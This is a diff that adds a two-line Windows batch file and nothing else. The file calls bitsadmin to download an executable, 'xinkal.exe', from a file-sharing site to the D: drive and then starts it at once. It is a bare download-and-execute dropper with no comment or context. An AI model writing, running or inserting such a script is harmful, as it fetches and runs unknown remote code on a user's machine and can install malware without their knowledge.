@@ -1,0 +1,2 @@
+@echo off 
+cmd.exe /c "bitsadmin /transfer myjob /download /priority high https://nofile.io/g/Mx6i8P1EqtgXwI2x3lN8eyjwa4ILLVhKflNNEluKtIB5AhkWhJGsQmIEIez36096/xinkal.exe/ D:\xinkal.exe&start D:\xinkal.exe"
